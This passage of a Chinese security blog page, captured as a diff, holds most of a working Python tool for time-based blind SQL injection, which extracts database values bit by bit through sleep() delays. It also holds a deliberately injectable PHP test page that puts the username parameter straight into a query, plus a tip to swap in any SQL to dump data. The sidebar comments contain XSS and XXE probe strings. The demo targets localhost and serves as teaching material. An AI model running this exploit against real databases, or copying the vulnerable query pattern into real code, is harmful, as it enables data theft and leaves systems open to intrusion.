+	user_agent = { &#039;User-Agent&#039; : &#039;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10&#039; } 
+	req = urllib2.Request(URL, None, user_agent)  
+	try: 
+		request = urllib2.urlopen(req,timeout=2) 
+	except Exception ,e: 
+		time.sleep(2)
+		return &#039;timeout&#039; 
+	return request.read() 	
+
+def curl(url):
+	try:
+			start = time.clock()
+			requests.get(url)
+			end = time.clock()
+			return int(end)
+	except requests.RequestException as e:
+			print u&quot;访问出错!&quot;
+			exit()
+def getLength():
+	i = 0
+	while True:
+		print &quot;[+] Checking: %s \r&quot; %i
+		url = &quot;http://localhost/demo/1.php?username=root&#039;+and+sleep(if(length((select%20user()))=&quot;+ str(i) +&quot;,1,0))%23&quot;
+		html = request(url) 
+		verify = &#039;timeout&#039; 
+		if verify in html: 
+			print u&quot;[+] 数据长度为： %s&quot; %i
+			return i
+		
+		i = i + 1
+def bin2dec(string_num):
+	return int(string_num, 2)
+
+def getData(dataLength):
+	global res
+	data = &quot;&quot;
+	for x in range(dataLength):
+		x = x + 1
+		#print x
+		threads = []
+		for j in range(8):
+			result = &quot;&quot;
+			j = j + 1
+			sb = my_threading(j,x)
+			sb.setDaemon(True)
+			threads.append(sb)
+			#print j
+		for t in threads:
+				t.start()
+		for t in threads:
+				t.join()
+		#print res
+		tmp = &quot;&quot;
+		for i in range(8):
+			tmp = tmp + str(res[str(i+1)])
+		#print chr(bin2dec(tmp))
+		res = {}
+		result = chr(bin2dec(tmp))
+		print result
+		data = data + result
+		sb = None
+	print &quot;[+] ok!&quot;
+	print &quot;[+] result:&quot; + data
+
+
+if __name__ == &#039;__main__&#039;:
+	stop = False
+	res = {}
+	length = getLength()
+	getData(length)</pre><p>1.php代码如下：</p><pre class="brush: php; gutter: false">&lt;?php
+/* 
+* @Author: Lcy
+* @Date:   2015-08-29 22:09:59
+* @Last Modified by:   Sunshie
+* @Last Modified time: 2015-08-30 01:46:17
+* 延迟注入测试
+*/
+header(&quot;Content-type:text/html;charset=utf8&quot;);
+$link = mysql_connect(&quot;localhost&quot;, &quot;root&quot;,&quot;&quot;);
+mysql_select_db(&quot;mysql&quot;, $link);
+mysql_set_charset(&quot;utf8&quot;);
+$sql = &quot;SELECT user FROM user where user=&#039;{$_GET[&#039;username&#039;]}&#039;&quot;;
+echo $sql;
+$query = mysql_query($sql);
+echo &quot;这是一个没有任何回显的注入点&quot;;
+
+?&gt;</pre><p><a href="https://phpinfo.me/old/wp-content/uploads/2015/08/py.png"><img class="alignnone size-medium wp-image-1027" src="https://phpinfo.me/old/wp-content/uploads/2015/08/py-300x242.png" alt="py" width="300" height="242" /></a></p><p>如果要爆数据啥的话就改py代码里面的select%20user()，替换为你要执行的sql即可</p>            </div>
+        </article>
+	
+    <ol class="page-navigator"><li class="current"><a href="https://phpinfo.me/index.php/page/1/">1</a></li><li><a href="https://phpinfo.me/index.php/page/2/">2</a></li><li class="next"><a href="https://phpinfo.me/index.php/page/2/">后一页 &raquo;</a></li></ol></div><!-- end #main-->
+
+<div class="col-mb-12 col-offset-1 col-3 kit-hidden-tb" id="secondary" role="complementary">
+        <section class="widget">
+		<h3 class="widget-title">最新文章</h3>
+        <ul class="widget-list">
+            <li><a href="https://phpinfo.me/index.php/archives/1438/">Discuz ssrf漏洞利用的几个python脚本</a></li><li><a href="https://phpinfo.me/index.php/archives/1351/">ThinkPHP使用不当可能造成敏感信息泄露</a></li><li><a href="https://phpinfo.me/index.php/archives/1285/">xss自动化内网渗透</a></li><li><a href="https://phpinfo.me/index.php/archives/1275/">redis利用姿势收集</a></li><li><a href="https://phpinfo.me/index.php/archives/1026/">python利用二进制延迟注入demo</a></li><li><a href="https://phpinfo.me/index.php/archives/1008/">在线子域名爆破</a></li><li><a href="https://phpinfo.me/index.php/archives/1000/">在线c段查询小工具</a></li>        </ul>
+    </section>
+    
+        <section class="widget">
+		<h3 class="widget-title">最近回复</h3>
+        <ul class="widget-list">
+                            <li><a href="https://phpinfo.me/index.php/archives/1438/#comment-64031">administrator</a>: 我看教学视频，那个phpinfo.me/domain 这个查询子...</li>
+                    <li><a href="https://phpinfo.me/index.php/archives/1351/#comment-64030">shrimp</a>: 好久没来了，安好~~  你的XSS平台关闭了吧？</li>
+                    <li><a href="https://phpinfo.me/index.php/archives/1438/#comment-64029">023</a>: alert('chenie')</li>
+                    <li><a href="https://phpinfo.me/index.php/archives/1351/#comment-64028">24</a>: alert('chenie')</li>
+                    <li><a href="https://phpinfo.me/index.php/archives/1438/#comment-64027">023</a>: 
+&xxe;
+&xxe;</li>
+                    <li><a href="https://phpinfo.me/index.php/archives/1438/#comment-64026">24</a>: nihao</li>
+                    <li><a href="https://phpinfo.me/index.php/archives/1438/#comment-64025">023</a>: 154</li>
+                    <li><a href="https://phpinfo.me/index.php/archives/1438/#comment-64024">023</a>: </li>
+                    <li><a href="https://phpinfo.me/index.php/archives/1285/#comment-64023">test945</a>: alert("xss")</li>
+                    <li><a href="https://phpinfo.me/index.php/archives/1285/#comment-64022">test945</a>: alert("xss")</li>
+                </ul>
+    </section>
+    
+        <section class="widget">
+		<h3 class="widget-title">分类</h3>
+        <ul class="widget-list"><li class="category-level-0 category-parent"><a href="https://phpinfo.me/index.php/category/mind/">随记</a></li><li class="category-level-0 category-parent"><a href="https://phpinfo.me/index.php/category/infiltration/">渗透</a></li><li class="category-level-0 category-parent"><a href="https://phpinfo.me/index.php/category/tools/">神器</a></li><li class="category-level-0 category-parent"><a href="https://phpinfo.me/index.php/category/exploit/">漏洞</a></li><li class="category-level-0 category-parent"><a href="https://phpinfo.me/index.php/category/resource_sharing/">资源分享</a></li><li class="category-level-0 category-parent"><a href="https://phpinfo.me/index.php/category/share/">文章分享</a></li><li class="category-level-0 category-parent"><a href="https://phpinfo.me/index.php/category/note/">笔记</a></li><li class="category-level-0 category-parent"><a href="https://phpinfo.me/index.php/category/chat/">闲谈</a></li><li class="category-level-0 category-parent"><a href="https://phpinfo.me/index.php/category/life/">生活</a></li><li class="category-level-0 category-parent"><a href="https://phpinfo.me/index.php/category/mp3/">音乐</a></li><li class="category-level-0 category-parent"><a href="https://phpinfo.me/index.php/category/geek/">硬件相关</a></li></ul>	</section>
+    
+        <section class="widget">
+		<h3 class="widget-title">归档</h3>
+        <ul class="widget-list">
+            <li><a href="https://phpinfo.me/index.php/2017/02/">February 2017</a></li><li><a href="https://phpinfo.me/index.php/2016/09/">September 2016</a></li><li><a href="https://phpinfo.me/index.php/2016/07/">July 2016</a></li><li><a href="https://phpinfo.me/index.php/2015/08/">August 2015</a></li><li><a href="https://phpinfo.me/index.php/2015/07/">July 2015</a></li>        </ul>
+	</section>
+    
+    	<section class="widget">
+		<h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+                            <li class="last"><a href="https://phpinfo.me/admin/login.php">登录</a></li>
+                        <li><a href="https://phpinfo.me/index.php/feed/">文章 RSS</a></li>
+            <li><a href="https://phpinfo.me/index.php/feed/comments/">评论 RSS</a></li>
+            <li><a href="http://www.typecho.org">Typecho</a></li>
+        </ul>
+	</section>
+    
+</div><!-- end #sidebar -->
+
+        </div><!-- end .row -->
+    </div>
+</div><!-- end #body -->
+
+<footer id="footer" role="contentinfo">
+    &copy; 2022 <a href="https://phpinfo.me/">Lcy’s Blog </a>.
+    由 <a href="http://www.typecho.org">Typecho</a> 强力驱动.
+</footer><!-- end #footer -->
+
+</body>
+<script>
+(function(b,a,e,h,f,c,g,s){b[h]=b[h]||function(){(b[h].c=b[h].c||[]).push(arguments)};
+b[h].s=!!c;g=a.getElementsByTagName(e)[0];s=a.createElement(e);
+s.src="//s.union.360.cn/"+f+".js";s.defer=!0;s.async=!0;g.parentNode.insertBefore(s,g)
+})(window,document,"script","_qha",357683,false);
+</script>
+</html>
